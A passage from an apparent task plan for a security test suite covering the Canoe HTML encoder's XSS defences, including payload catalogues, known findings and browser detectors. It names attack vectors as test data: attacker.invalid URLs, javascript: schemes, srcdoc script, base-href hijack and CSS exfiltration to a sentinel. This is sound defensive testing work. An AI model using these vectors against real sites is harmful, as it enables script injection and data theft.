Document the offline story: `browserTest` skips with a clear message when browsers are absent rather
than failing.
*Done when:* `./gradlew test` runs no browser tests and needs no network; `./gradlew browserTest`
runs a trivial smoke test in Chromium.
*Depends on:* T1.

**T3. Write `CanoeTestSupport`.**
The rendering harness from §3, plus: `contextAfter(String templatePrefix)` returning
`currentContext()`; `renderOrError(...)` returning a result object that distinguishes clean output
from an encoding error; a `decodeAttribute(html, selector, attr)` helper built on jsoup that performs
the entity decoding the browser would; and constants naming the six `CTX_*` values so assertions read
as English rather than integers.
*Done when:* a hand-written smoke test reproduces the F1 `onsubmit` result from §3.
*Depends on:* T1.

**T4. Define `Verdict`, `XssCase`, and the corpus skeleton.**
`XssCase` carries: stable id, template string, sink description (element + attribute + which parser
consumes it), applicable payload families, ledger verdict, optional finding reference (F1–F12),
optional note, a `browserRelevant` flag, and — added later, see §5.2 — a per-payload
`browserObservable` flag defaulting to true. Provide a fluent builder. Seed `CanoeCorpus` with
roughly ten cases covering the shapes in §3 so downstream tasks have something to run against.
*Done when:* the corpus is enumerable and each seed case round-trips through `CanoeTestSupport`.
*Depends on:* T3.

**T5. Write `Payloads`.**
The payload families in Appendix B, as named constants with a short comment for each explaining what
it is trying to reach. Include the inert marker value used by the differential oracle (T24) — a
string of the same length composed only of characters no encoder touches.
*Done when:* every family is referenced by at least one seed case.
*Depends on:* T4.

### Phase 1 — Unit level: state machine and encoders

**T6. `CanoeStateMachineTest` — context classification.**
Table-driven. For each template prefix in Appendix A §A.1, assert the resulting `currentContext()`.
Covers every state in the machine including the ones `currentContext()` has no case for
(`TAG_ATTR_VALUE_BEFORE`, `TAG_ATTR_NAME`, `COMMENT_*`, `DOCTYPE*`, `INVALID`) — F11's territory.
Include the RCDATA/RAWTEXT elements Canoe does not model (`textarea`, `title`, `xmp`, `noembed`,
`noscript`, `iframe`) and record that they resolve to `CTX_HTML`.
*Done when:* every `case` label in `reallyProcessChar` is reached by at least one test; verify with a
coverage run.
*Depends on:* T3.

**T7. `CanoeWriterContractTest` — the `Writer` API (F9).**
`Canoe` is a public `Writer` with no documented restriction. Test every inherited entry point:
`write(int)`, `write(char[])`, `write(char[],int,int)`, `write(String)`, `write(String,int,int)`,
`append(char)`, `append(CharSequence)`, `append(CharSequence,int,int)`. Assert that a non-zero offset
parses the right characters — today `write(buf, 3, 12)` on a 15-char array parses indices 3–11 and
writes 3–14, so one character reaches the response unparsed and the final context is wrong (measured:
`CTX_SUPPRESS` where `CTX_HTML` is correct). Ledger these as `KNOWN_VULNERABLE` against F9 with a
note that they are latent, not currently reachable through Velocity.
*Done when:* the offset arithmetic is pinned in both the success and the `IOException` error path.
*Depends on:* T3.

**T8. `HtmlEncoderTest` — the primitives.**
`html`, `htmlWhite`, `htmlWhiteLineBreaks`, `js`, `css`, `asis`. Sweep every code point in
U+0000–U+FFFF plus a sample of astral planes and assert the allowlist holds: for `html`, only
`[a-zA-Z0-9]` survives naked; for `htmlWhite`, additionally space, tab, CR, LF. Assert `<` can never
appear in `html`/`htmlWhite` output for any input — the property the review's corollary rests on, and
the single most valuable assertion in the file. Cover lone surrogates, unpaired high/low surrogates,
U+2028/U+2029, and the C0 `\xNN` visible-control representation. Null input returns null throughout.
*Done when:* the sweep runs in under a second and the `<`-freedom property is stated as an explicit
named test.
*Depends on:* T1.

**T9. `HtmlEncoderUrlTest` — `url()` as an origin filter (F6).**
Separate file because it is the only encoder with structure. Test the `^(https?://)([^/]+)(/.*)?$`
regex against: absolute `http`/`https` (scheme emitted verbatim, host survives), protocol-relative
`//attacker.invalid` (passes through byte-for-byte — F6), uppercase `HTTP://` (regex is
case-sensitive, so the colon is escaped), `javascript:`, `data:`, `vbscript:`, backslash variants
`\\/\\/`, `/\`, `https:/\`, userinfo `https://x@attacker.invalid`, credentials with `@`, IDN and
punycode hosts, IPv6 literals, null `m.group(3)`, and the `?`/`#`/`=` characters the allowlist
permits. Ledger the protocol-relative and absolute-off-origin cases as `KNOWN_VULNERABLE` / F6.
*Done when:* every branch of `url()` is exercised and the off-origin gap is explicit.
*Depends on:* T1.

**T10. `detectAttributePrefix` unit tests (F4, F5).**
Direct tests of the interaction between `setTagAttributeContext()` and `detectAttributePrefix()`.
Assert the unconditional `attributeContext = ATTR_HTML` reset at `Canoe.java:224` — the F4
mechanism — by showing `style="color:` lands in `CTX_HTML_ATTR` while `style="` lands in
`CTX_SUPPRESS`. Parameterise the colon position from 0 to 12 to pin the `bufLen == 10` boundary (the
review corrected itself here once; a test settles it permanently). Cover every prefix the function
knows: `asfunction:`, `data:`, `javascript:`, `livescript:`, `mocha:`, plus case variations and
near-misses.
*Done when:* the colon-position boundary and the context-widening reset are both pinned.
*Depends on:* T3.

**T11. `CanoeRobustnessTest` — templates Canoe rejects.**
The five availability defects found in §3, plus the rest of Appendix A §A.7. Each asserts a
`REJECTED` verdict with the exact error message and the reported line/position, so a future fix to
the tokenizer is visible.

Additionally, pin **F13**: `VelocityViewFactory.render()` intends to catch encoding errors and append
`[Encoding Error]`, but it tests `startsWith(Canoe.ERROR_PREFIX)` on the top-level exception and
Velocity always wraps the `IOException`, so the branch is unreachable and every encoding error is an
unhandled 500. Pin it **through the real `render()`**, not by re-applying its predicate to an
exception the harness produced: a copy of a broken check keeps passing after the check is fixed, and
§2.1 requires the opposite. Assert what a caller observes — an exception escapes and no
`[Encoding Error]` appears — and assert what the partially written response actually contains, which
for an error inside a tag ends mid-element.
*Done when:* every `raiseError()` message in `Canoe.java` is reached by at least one test **and** the
call-site count is pinned (there are 15 sites and 13 distinct messages, so a set comparison alone
cannot see a new site added with an existing message), and F13 is pinned in both directions against
the production path.
*Depends on:* T3.

### Phase 2 — Velocity end-to-end

**T12. Build out the corpus.**
Expand `CanoeCorpus` to the full catalogue in Appendix A. This is the largest single task and the
spine of everything after it; it is mostly data entry, but every ledger verdict needs a human
decision. Split across several sittings by section if useful. Each case gets its verdict determined
by running it, then reviewed by hand against the sink — never the other way round, or the ledger just
records bugs as intended behaviour.
*Done when:* Appendix A §§A.1–A.8 are represented and every case has a reviewed verdict.
*Depends on:* T4, T5.

*Delivered.* §§A.1 (33 cases), A.2 (59), A.4 (27) and A.7 (30), plus the six §A.3 seeds — 153 cases
and 774 (case, payload) pairs. §A.3's remaining event-handler names were **left to T15**, which
needed the exhaustive `on*` table `CanoeStateMachineTest` already owns; T15 has since filled §A.3 in
to 116 cases — 115 handler names plus the `onredystatechange` misspelling that is F19's evidence —
and T16–T18 added the URL-position, CSS-property and stylesheet shapes their properties needed,
taking the corpus to 275 cases and 996 pairs. §A.6 is delivered by T19 and §A.8 is covered by
`CanoeWriterContractTest` and T21. §A.6's cases live in `VelocityIntegrationTest` rather than in
`CanoeCorpus`, deliberately: a corpus case is a *sink* with a reviewed verdict, and a reference form
is not a sink — `$data`, `$!data` and `${data}` in `<p>...</p>` are one sink and one verdict written
three ways. What varies there is whether the encoder runs, which is a property of
`CanoeReferenceInsertionHandler` and of Velocity, so the file states it directly. Verdict spread across the whole corpus is now 564 SAFE, 281
KNOWN_VULNERABLE, 77 SUPPRESSED_BY_DESIGN, 30 SUPPRESSED_UNINTENDED, 44 REJECTED; 128 pairs are
browser-relevant against §A.9's ~150 target, of which 24 are flagged not browser-*observable* (§5.2).

*Reviewed.* The build-out was reviewed on 2026-07-26 and the ledger held — no wrong `SAFE` verdict
over a 240-invocation hand sample, the first review of this suite to find none. Eight strengthening
changes came out of it, three of them to the oracles rather than to the data; they are listed in
§0.10 and are the reason the counts above differ from the ones first recorded here.

**T13. `BodyContextTest`.**
The review's "what is not affected" claim, as tests. Every payload family into `<p>$data</p>` and
variants: nested elements, adjacent references, references either side of a tag boundary, references
inside RCDATA (`<textarea>`, `<title>`) and RAWTEXT (`<xmp>`, `<noembed>`, `<noscript>`) elements,
inside HTML comments, inside conditional comments, and immediately before/after a `<script>` block.
Assert the `<`-freedom property end to end.
*Done when:* the body-context safety claim is backed by executable evidence rather than by argument.
*Depends on:* T12.

*Delivered.* 143 tests. The file **consumes** the §A.1 body-context cases rather than re-declaring
their templates — selected by sink kind, so a case added later is picked up without anyone
remembering to — and adds the three things a per-case ledger cannot state: the `<`-freedom property
quantified over every body case and every payload in the catalogue; the four surviving character
categories as literal rendered output; and the RCDATA/RAWTEXT *distinction* rather than its
conclusion, since "safe" either way would hide a regression in one of the two. Its javadoc states the
corpus/property split so nobody merges them. One clarification to the review: DEL sits above the C0
range and renders as `&#127;`, not `\x7F` — the review's sentence is right and invites the wrong
reading. The `<`-freedom property is asserted here in its readable form only, against the extracted
encoded region; the airtight delimiter-count form lives in
`CanoeCorpusTest.payloadsCannotAddMarkupDelimitersToOutput`, which already runs it over a strict
superset of these rows, and running it twice was 82 duplicate assertions and an invitation to fix one
copy (§0.12).

**T14. `AttributeNameMatrixTest`.**
The ~90-name matrix from Appendix A §A.2, each rendered as `<tag NAME="$data">` with an appropriate
element. Groups: the five recognised `ATTR_URI` names; `style`; `data`; the plain-text names that are
genuinely safe under `ATTR_HTML` (`id`, `class`, `title`, `alt`, `value`, `name`, `placeholder`); the
URL-bearing names Canoe misses (`action`, `formaction`, `poster`, `cite`, `usemap`, `longdesc`,
`codebase`, `manifest`, `ping`, `srcset`, `imagesrcset`, `xlink:href`, `xml:base`, `href` on
`<base>`); the markup-bearing `srcdoc`; and `content` on `<meta http-equiv=refresh>`. Include
case permutations (`HREF`, `HrEf`, `ONCLICK`) and separator permutations (`href =`, `href\t=`,
`href\n=`, duplicate attributes, attributes after a `/`).
*Done when:* every name in Appendix A §A.2 has a case and a verdict; F3's table is fully covered.
*Depends on:* T12.

*Delivered.* 231 tests over a 90-row matrix. The corpus already held every §A.2 name, so this file
consumes it — `everyAttributeNameTheCorpusExercisesIsInTheMatrix` fails if a case names an attribute
the matrix never classifies — and adds the **partition assertion**, which agrees with the review
exactly: five `ATTR_URI` names, one `ATTR_CSS`, one `ATTR_CONTENT`, `ATTR_JS` only ever on `on*`
names, everything else `ATTR_HTML`, and nothing producing `ATTR_DATA` or `ATTR_ACTIONSCRIPT` from a
name at all. A source-derived guard reads the non-handler branches out of `Canoe.java` the way
`CanoeStateMachineTest` reads the `on*` ones, which pins **F7** in a form that cannot be argued with:
the branch commented `// content` compares the characters of `data`, and the branch commented
`// data` is byte-identical to it. **F21** came out of asserting the `ATTR_*` value and the `CTX_*` it
produces together. `aPlainTextAttributeReceivesThePayloadWholeAndAsText` is parameterised over
(name, payload) rather than looping inside one `@Test`, so a failure names the row that failed
instead of stopping the sweep at the first one (§0.12).

**T15. `EventHandlerMatrixTest`.**
Separate from T14 because it is the largest group and the highest-severity one (F1, F2). Every one of
the **21** genuinely recognised handlers → expect `SUPPRESSED`. Every one of the ~60 unrecognised
modern handlers listed in F2 → expect `KNOWN_VULNERABLE`. `onselect` and `onsubmit` →
`KNOWN_VULNERABLE` against F1, with a comment pointing at the `buf[0]` bug, and
`onreadystatechange` → `KNOWN_VULNERABLE` against F19, with a comment pointing at the missing `a`, so
the next reader sees why the three are separated out. Note the count: the source declares 24 `on*`
branches and 21 of them work; `CanoeStateMachineTest.everyDeclaredOnStarBranchNameIsClassified`
already asserts all 24 by name, so T15's job is the *unrecognised* set and the completeness guard.
Include the dead `ondragdrop` (recognised, but the event no longer exists) as a curiosity case.
Add a **completeness guard**: a test that enumerates handler names from a checked-in list derived
from the HTML Standard's event handler content attributes, and fails if any name is absent from the
corpus. That converts "we listed the ones we thought of" into "we cover the spec", and it will fail
usefully when the list is next refreshed.
*Done when:* the recognised/unrecognised partition is complete and the completeness guard passes.
*Depends on:* T12.

*Delivered.* 125 tests, and 111 new corpus cases generated from two name lists by a `handler()`
helper rather than hand-written — §A.3 goes from 5 cases to 116. One representative payload per name
for the bulk (the 115 names reach the identical comparison chain and the per-payload distinctions are
properties of `html()` and of the JavaScript parser, not of the name); the full `QUOTE_BREAKOUT` +
`ENTITY_BREAKOUT` pairing only on the four headline handlers. The completeness guard reads
`src/test/resources/canoe/html-event-handler-attributes.txt`, whose header records its provenance and
transcription date and what is deliberately excluded, and fails if a spec name has no case — driven,
since the review of this task, by `namesWithNoCase`, the guard's own logic, so the self-test exercises
the guard rather than the resource file (§0.12). **F2's count is corrected**: 76 of the standard's 94
missed, not "roughly 40" and not the 74 of 92 first recorded here — that figure came from a
transcription of the wrong section, and §0.12 has the arithmetic. The `browserObservable` edge is
recorded rather than worked around: `ondragdrop` cannot carry the flag because it is suppressed, so
its dead-event note lives on the case; `handler.onshow` is the one browser-relevant handler that is
both injectable and fired by nothing, and it carries the flag with the argument written out, as do
the two `Document` IDL names for the different reason that no element hosts them.

**T16. `UrlSinkTest`.**
`href`, `src`, `background`, `dynsrc`, `lowsrc` across the elements that matter — `<a>`, `<img>`,
`<script>`, `<iframe>`, `<embed>`, `<object>`, `<link>`, `<form>`, `<base>`. The key case is the one
the review calls out: Canoe discards the tag name once attribute parsing begins, so `src` on
`<script>` and `src` on `<img>` get the same encoder. Cover full-URL substitution, path-suffix
substitution (`<script src="$base/app.js">`), query-parameter substitution, and fragment
substitution — the four positions behave differently under `url()`.
*Done when:* F6's exploitation vector is a running test, and the tag-name-blindness is pinned.
*Depends on:* T12.

*Delivered.* 368 tests. The file consumes the §A.2 URL cases and adds the two things their verdicts
cannot say. **Tag-name blindness as an equality**: the same payload through `href`/`src` on all seven
elements Canoe classifies as `ATTR_URI` must produce byte-identical output, because the claim is not
"each is percent-encoded" but "Canoe cannot tell them apart" — that is F6's structural cause and it is
the test remediation item 5 has to break. The nine (element, attribute) pairs the task names are a
table, so the three that are *not* `CTX_URI` state their finding rather than being an exception:
`<object data>` is F7 and `<form action>` is F3. **The four substitution positions** are the second
property, and they turn out to bound F6 more sharply than the finding does: `url()` emits
byte-identical output in all of them, and only full-URL and path-prefix let the payload reach the
URL's authority, so query and fragment substitution are safe because of the *template*, not the
encoder. Three element cases (`url.iframe-src`, `url.embed-src`, `url.link-href`) and two position
cases (`url.href-query-parameter`, `url.href-fragment`) were added to the corpus for it; a positional
rule with no negative rows is an assertion about whichever cases somebody chose.

**T17. `CssContextTest`.**
`style="$x"` (suppressed, correct) versus `style="color:$x"` (html-encoded — F4). Parameterise the
CSS property preceding the reference across the whole set that matters, since the colon position
decides the outcome: `color:`(5), `width:`(5), `margin:`(6), `padding:`(7), `display:`(7),
`position:`(8), `font-size:`(9), `background:`(10) all trigger; `text-decoration:`(15) does not.
Also: reference inside a `url()`, inside a quoted CSS string, after a `;`, inside `@media`, and
inside a `<style>` element body.
*Done when:* the colon-position boundary is pinned at the Velocity level as well as the unit level.
*Depends on:* T12, T10.

*Delivered.* 72 tests. The property is that F4's precondition is *an integer* rather than a property
name, so every property the finding lists is a row asserting three things together — the colon's
index, the context that implies, and what the CSS parser is handed — which forces `padding:` and
`display:` to agree (both 7) and `background:` and `font-family:` to differ (10 and 11). The
complementary half is that the CSS states never call `detectAttributePrefix()` at all, so a colon in
a `<style>` body does nothing at any nesting depth: identical declarations, suppressed in a
stylesheet and injectable in an attribute. Two shapes had no case and now do — a reference inside a
quoted CSS string (`content:'$x'` injectable, `font-family:'$x'` suppressed, four characters apart,
so the quoting is worth nothing) and one inside an `@media` block — along with `margin`, `display`
and `position`. `theResetDowngradesEveryClassificationAndNotOnlyTheCssOne` puts F4's CSS half, F4's
URI half and F17 in one test, because they are one line of code.

**T18. `ScriptAndStyleElementTest`.**
References inside `<script>` and `<style>` bodies — all suppressed today, so these are mostly
`SUPPRESSED` ledger entries. The interesting cases are the desyncs from F10: `</scriptfoo>` is
accepted as a terminator (Canoe returns to HTML while the browser stays in script data), and
`<script>x = 1 <</script>` leaves Canoe stuck in `SCRIPT` and suppresses the remainder of the page.
Both were reproduced. Ledger as `KNOWN_VULNERABLE` / F10 with the review's note that they are not
attacker-reachable *today* precisely because attacker data can never emit a raw `<` — and cross-link
to T23, which is the test that guards that precondition.
*Done when:* both desync directions are pinned and the dependency on T23's property is documented in
the test.
*Depends on:* T12.

*Delivered.* 80 tests. F10 is a disagreement between two parsers, which is exactly what a
single-parser ledger row cannot record, so the file puts the same string through Canoe's state
machine and through jsoup and requires them to differ — forward (`</scriptfoo>`: Canoe in `CTX_HTML`,
jsoup still inside the `<script>` element) and converse (`x = 1 <`: Canoe still in `CTX_JS` three
elements later, jsoup having closed the script). The CSS twins are measured rather than inferred from
the source being identical, because the two states differ in one respect that could plausibly have
changed the answer — `SCRIPT` produces `CTX_JS` and `CSS` produces `CTX_SUPPRESS` (F21).
`onlyTemplateTextCanCauseADesync` quantifies F10's reachability argument over every payload in the
catalogue and all seven templates, and its javadoc says plainly that **T23 is the general form** and
is not written yet.

Two things came out of it. The desync verdicts were **not** changed to `KNOWN_VULNERABLE` as the task
sketch asks: §2.1 defines that verdict as attacker data reaching the sink live, the desync is created
by template literal text, and `ledgerMatchesObservedBehaviour` rejects the change on sight. And F10's
refutation turns out to be narrower than it reads — it reasons about `htmlWhite()`, and after a
forward desync a URL attribute puts `url()` output into script data, where `=` and `/` pass naked.
Still inert, for a different reason (the template's own `<a href="` is a JavaScript syntax error that
kills the whole block), and both halves are tests now. See §0.13.

**T19. `VelocityIntegrationTest`.**
The Velocity layer itself, independent of context. Reference forms: `$data`, `$!data`, `${data}`,
`$!{data}`, `$data.method()`, `$data.property`. The bypass: `$_x.asis()` and `$!_x.asis()` bypass;
`${_x.asis()}` does **not** (confirmed in §3 — a genuine trap worth a named test); `$_xy.asis()` is
not treated as a bypass. Directives: `#if`, `#foreach`, `#macro`, `#parse`, `#include`, `#evaluate`,
and `#set` — both the plain form (single-encodes correctly) and the interpolated-string-literal form
(double-encodes — F12, now confirmed). Values: null, empty string, a non-`String` object whose
`toString()` returns markup, a collection, an array, a number. Undefined references (`$missing`
renders literally as `$missing`). Two references in one tag; a reference spanning a state transition.
*Done when:* F12 moves from "unverified" to a passing ledger entry, and the formal-notation bypass
asymmetry has a test that explains itself.
*Depends on:* T12.

*Delivered.* 40 tests. F12 is pinned as the review's exact golden and bounded in three directions —
the plain `#set` is correct, the same interpolation inside a `<script>` or a recognised handler
produces nothing at all, and against an *unrecognised* handler the double encoding **neutralises**
F2's mechanism, which means fixing F12 before F1/F2/F19 makes some templates injectable that are
safe today. The formal-notation trap has both spellings (`${_x.` and `$!{_x.`) and its output is
asserted byte-identical to never having called the tool, so the bypass is absent rather than
partially applied. `#include` is separated from `#parse` as the one directive that never fires the
handler — and whose bytes still steer Canoe, which is correct under §2.5 and is the kind of thing
that gets mistaken for data. The plan's own claim about undefined references does not reproduce; see
§A.6.

**T20. `ViewFactoryRenderTest` — the real production path.**
Everything above uses `engine.evaluate()`. This task exercises `VelocityViewFactory.render(page,
view, writer)` with mocked servlet objects, in the style of the existing `TestRouting`, against
file-backed `.vm` templates in `src/test/resources/canoe/templates`. Purpose: prove that the fast
harness and the production path agree. Pick a dozen representative cases from across the corpus and
assert byte-identical output from both paths. Also cover `setAutoEscaping(false)` (no encoding at
all), `allowDirectOutput()` (the `$_x` tool is present), and the `[Encoding Error]` swallow path.
*Done when:* the twelve cases match byte-for-byte, so the rest of the suite's use of `evaluate()` is
justified.
*Depends on:* T12.

*Delivered.* 49 tests, and the sketch's "mocked servlet objects" is not what landed: mockito-core
5.11.0's ByteBuddy cannot instrument a class on JDK 25, so a real `Page` and a real
`QlueApplication` are used instead — strictly better evidence, since nothing between the template and
the response writer is a stand-in. Fourteen `.vm` fixtures live in
`src/test/resources/canoe/templates/`, each asserted to be a verbatim copy of the corpus case it
names, with a directory listing that fails on an orphaned fixture. The two paths agree byte for byte
on every row for the representative payload, the inert marker, the empty string **and every payload
the case carries**. All three production switches are covered, and `setAutoEscaping(false)` gets the
assertion that is easy to miss: Canoe still parses, so §3's availability defects survive the switch.
**F22** came out of building the classpath engine — `buildDefaultVelocityProperties()` declares a
`class` resource loader and never says which one, so an engine built from the base class's own
properties does not start.

### Phase 3 — Properties and invariants

These are where vulnerabilities nobody has written down get found. Each states a property that should
hold for *all* inputs, then hunts for counterexamples across the corpus.

**T21. `ChunkInvarianceTest`.**
For every corpus template, feed it to a `Canoe` split at every possible index (and at a sample of
random multi-way splits), and assert that the output and the final `currentContext()` are identical
to the unsplit run. Any divergence is a state machine that depends on buffer boundaries — a class of
bug that is invisible in normal testing and appears the moment a buffering wrapper is introduced.
Expect this to surface F9 immediately; that is a feature.
*Done when:* the property runs across the corpus and every counterexample is either fixed or
ledgered.
*Depends on:* T12.

*Delivered.* 554 tests. The property holds with **no counterexample**: every one of the 9,996 two-way
splits of the corpus's 275 templates, plus 20 seeded multi-way splittings each, produces identical
output, identical rejection and identical final parser state. What is sampled is the multi-way case
only — the space of ways to cut a 232-character template into five pieces is combinatorial — and the
two-way sweep is exhaustive. F9 does surface, and the file's second half measures it rather than
restating it: the *identical* pieces fed through `write(char[], offset, length)` desynchronise **243
of the 275** templates on one mid-point split, which is the gap between the entry point Velocity uses
and the one beside it. The comparison has a self-test proving it can fail.

**T22. `BufferResidueTest` (F5).**
The review's most subtle finding, and the one hardest to reason about, so it gets a property rather
than examples. For a fixed target template — `<a href="javascript:f('$data')">` — prepend every
benign preceding element from a generated set whose attribute names range from 1 to 20 characters,
and assert the rendered output is identical in all cases. It is not: names of 11+ characters leave
residue at `buf[10]` and defeat the `javascript:` check, while a name of exactly 10 characters
repairs it. Extend the property to the `data:`/`mocha:` checks that read `buf[4]`/`buf[5]`, and to
residue carried across separate `write()` calls within one render.
*Done when:* the length-dependence is characterised as a table (prefix length → resulting context)
and ledgered against F5. When the fix lands, the table collapses to a single value and the test says
so.
*Depends on:* T12.

*Delivered.* 39 tests. Twenty renders of one template into one sink produce **exactly two** outputs,
split between 10 and 11, and each row asserts the byte at `buf[10]` that decided it — `'\0'` or
`'q'` — so the evidence is the cause rather than the symptom. Three things the finding states in
prose are assertions now: the repair is directional (11 then 10 is safe, 11 then 9 is not, and
swapping the two elements flips the page), the residue crosses `write()` boundaries (one call, two
calls and 39 calls reach the same byte, which matters because Velocity never writes a template in one
call), and the shorter indices are worse — `data:` reads `buf[4]` and is defeated by `title`,
`mocha:` reads `buf[5]` and is defeated by `background`, with no preceding element involved at all.
The 11-character row is carried through to the sink: the jsoup-decoded `href` contains `');`, which
is the step that makes F5 High.

**T23. `ParserSteeringTest` — the corollary, as a property.**
The review's central safety argument is that attacker data can never move Canoe's state machine,
because no encoder can emit a raw `<` and quotes are always neutralised. F10's unexploitability
depends on it, and the review explicitly asks that any future relaxation of the encoders be checked
against it.

The property: for every corpus template, the *sequence* of `currentContext()` values observed at each
reference position must be identical whether the reference value is the inert marker or any payload
in the corpus. Run it across the full payload set, including the ones designed to break out.
*Done when:* the property holds across the corpus, and the test's Javadoc states plainly that
relaxing `CTX_JS`/`CTX_CSS` suppression to real escaping requires re-running it first.
*Depends on:* T12.

*Delivered.* 656 tests, and the property **holds** over all 275 templates against all 52 payloads —
the full catalogue, not the payloads each case declares, because the question is what any value can do
to the parser rather than what the families somebody chose can do. Whether Canoe *rejects* a template
is asserted as a second, separate property, because a payload that changed that would be steering the
machine into `INVALID`, a position the context sequence cannot represent. The mechanism is asserted
directly rather than inferred: no encoder `Canoe.encode()` can dispatch to emits `<`, `>`, `"` or `'`
for any payload, which is a claim about five functions. The encoder-relaxation gate is written into
the javadoc *and* into a test — `theJsAndCssContextsPassVacuouslyBecauseTheyEmitNothing` fails the
moment `Canoe.java:1074-1081` is uncommented, and its message says what to run next. Observing the
sequence at all needed a `Canoe` subclass in the writer's place (`ContextRecordingCanoe`), since only
`CanoeReferenceInsertionHandler` knows where a reference position is; `CanoeTestSupport` gained a
render overload taking a `Canoe` factory rather than the property test growing a second engine.

**T24. `DomEquivalenceTest` — the differential oracle.**
Render each case twice: once with the inert marker, once with each payload. Parse both with jsoup and
compare document structure — element count, tag names in order, attribute names per element. Identical
structure means the payload stayed inside the value it was meant to occupy. Any structural
divergence is an injection, whether or not anyone predicted it.

This is the highest-yield test in the suite for *unknown* vulnerabilities, because it needs no
opinion about which characters are dangerous. Note the known limitation: it catches structural
injection (new elements, new attributes) but not value-level injection into a live sink — `srcdoc`,
`javascript:` URLs, and CSS all keep the document structure intact. Those are covered by the sink
liveness assertions in T14/T16/T17 and by the browser tier.
*Done when:* the oracle runs over the corpus and every divergence is triaged into the ledger.
*Depends on:* T12.

*Delivered.* 280 tests, and **no divergence anywhere** over the full 275 x 52 cross-product — nothing
to triage. Rejected templates are compared on the shape of their partial output rather than skipped,
on the same argument that removed the early return from `payloadsCannotAddMarkupDelimitersToOutput`.
The file's most valuable test is the one that records what it cannot see:
`structuralEquivalenceDoesNotMeanSafeAndHereAreFourProofs` takes four cited `KNOWN_VULNERABLE` rows —
`srcdoc` (F3), a residue-disarmed `javascript:` URL (F5), a CSS overlay (F4) and `onsubmit` (F1) —
and asserts that this oracle is blind to every one, naming the test that is not. The non-blind
self-test includes the `<head>`-hoisting row specifically, because that is the shape the pre-§0.10
`body()`-scoped skeleton was blind to, and it is paired with an encoded control so that "the oracle
noticed" cannot be confused with "the oracle notices any change".

### Phase 4 — Browser confirmation

**T25. Sentinel HTTP server.**
A `com.sun.net.httpserver.HttpServer` on 127.0.0.1 with an ephemeral port. Routes: `/case/{id}`
serving rendered HTML with `Content-Type: text/html; charset=UTF-8` (matching what `VelocityView`
sets in production); `/beacon` and `/x.js` as same-origin sentinels; `/target` as a navigation
destination; and a request log the tests assert against. Runs per test class, torn down after.
*Done when:* a hand-written page loads in Chromium and a request to `/beacon` is observed in the log.
*Depends on:* T2.

**T26. `BrowserTestBase` — lifecycle and detectors.**
Playwright and browser instances shared across the class (they are expensive); a fresh
`BrowserContext` per case for isolation. Wire the five detectors from §5.2 before every navigation.
Capture a trace and a screenshot on failure. Provide a `BrowserVerdict` result object aggregating
what fired. Skip cleanly with an informative message when browsers are not installed.
*Done when:* the base class runs a trivial case in all three engines and reports a clean verdict.
*Depends on:* T25.

**T27. `DetectorSelfTest` — prove the oracle is not blind.**
For each of the five detectors, a deliberately *unencoded* page that must trip it: an inline
`onclick` that calls the exposed function; an `alert()`; an `<img src="https://attacker.invalid/b">`;
a `<meta http-equiv=refresh>` to `/target`; and a syntax error that logs to console. Every one must
fire. This test gates the rest of Phase 4 — if it is not green, no browser result means anything.
*Done when:* all five fire in all three engines.
*Depends on:* T26.

**T28. `BrowserCorpusTest`.**
The corpus filtered to `browserRelevant` cases (Appendix A §A.9 — roughly 150 cases, not the full
several thousand), each rendered, served, loaded, and checked against its ledger verdict in all three
engines. A `KNOWN_VULNERABLE` case must trip a detector; a `SAFE` case must trip none. Record
per-engine divergence explicitly rather than collapsing it: some legacy vectors (`mocha:`,
`livescript:`, `expression()`) are dead everywhere, and `xlink:href` and `srcdoc` behave differently
across engines. Divergence is data, not noise.
*Done when:* every browser-relevant case has a per-engine result and disagreements with the ledger
are triaged.
*Depends on:* T27, T12.

**T29. `SinkSpecificBrowserTest`.**
The four vectors the review specifically asks to see in a real browser, each with a bespoke assertion
rather than a generic detector: `srcdoc` (assert script executed *inside the iframe*, same-origin);
`xlink:href` in SVG (assert a synthetic click navigates to a `javascript:` URL); `<meta
http-equiv=refresh content="0;url=…">` (assert top-level navigation to the sentinel); and `<base
href>` hijack (assert subsequent relative resource loads retarget to the attacker origin — a vector
the review does not cover and which is worth checking directly). Add CSS exfiltration: assert that
attacker-controlled `style` content can issue a `background:url()` request to the sentinel, which is
F4's concrete impact.
*Done when:* each of the five has a passing, self-explanatory test in at least Chromium.
*Depends on:* T27.

### Phase 5 — Reporting and CI

**T30. Coverage gate.**
Add JaCoCo. Assert branch coverage of `Canoe.java` and `HtmlEncoder.java` above a threshold — aim for
95% on `setTagAttributeContext()` and `reallyProcessChar()` specifically, since an unreached branch in
either is by definition an untested security decision.
*Done when:* the gate is enforced in `check` and currently passes.
*Depends on:* Phase 1–3 complete.

**T31. Fuzz harness (optional, time-boxed).**
A bounded random-template generator producing structurally valid HTML with a reference placed at a
random position, run through T24's DOM equivalence oracle. Seeded and reproducible; a fixed iteration
count in CI, unbounded for local hunting. Any counterexample gets minimised and promoted into the
corpus as a permanent case.
*Done when:* a soak run produces either no counterexamples or new corpus entries.
*Depends on:* T24.

**T32. Concurrency test.**
One `Canoe` per render is the current design (`VelocityViewFactory.render()` constructs one per
call). Assert there is no shared mutable state: run N renders concurrently and assert each output
matches its single-threaded result. Cheap, and it pins an assumption the whole design rests on.
*Done when:* the test passes with a thread count well above the case count.
*Depends on:* T3.

**T33. `MatrixReportTest` — the suite as documentation.**
Emit `build/reports/canoe/matrix.md`: every case, its sink, the context Canoe assigns, the encoder
applied, the ledger verdict, the finding reference, and the browser result where available. Grouped
by sink category, with a summary count per verdict at the top.

This is what makes the suite useful to someone who is not reading the tests: it is the missing threat
model from F8, generated rather than written, and therefore always current. It also gives the fix
work a scoreboard — the `KNOWN_VULNERABLE` count is the number to drive to zero.
*Done when:* the report generates on every `test` run and reads well enough to check in as an
artifact.
*Depends on:* Phase 2–4 complete.

**T34. Documentation.**
Update `README.md` and `qlue_user_guide.md`, both of which currently promise unqualified XSS
prevention. State the real scope: what is encoded, what is suppressed, what is rejected, what is not
covered (external content inclusion — the caveat that only ever existed in the demo deleted at
`6d4cfcc`), and how `$_x` and `allowDirectOutput()` work. Link the generated matrix. Add a short
`src/test/java/.../canoe/README.md` explaining the ledger convention, so the first person to see a
`KNOWN_VULNERABLE` test fail knows it is good news.
*Done when:* a developer reading only the README would not write `<div style="color:$c">` believing
they are protected.
*Depends on:* T33.

---

## 7. Suggested order

T1 → T2 → T3 → T4 → T5 unlock everything and should land first, in one sitting if possible.

Then Phase 1 (T6–T11) and Phase 2's corpus build (T12) can proceed in parallel — Phase 1 needs only
the harness, and T12 is mostly data entry.

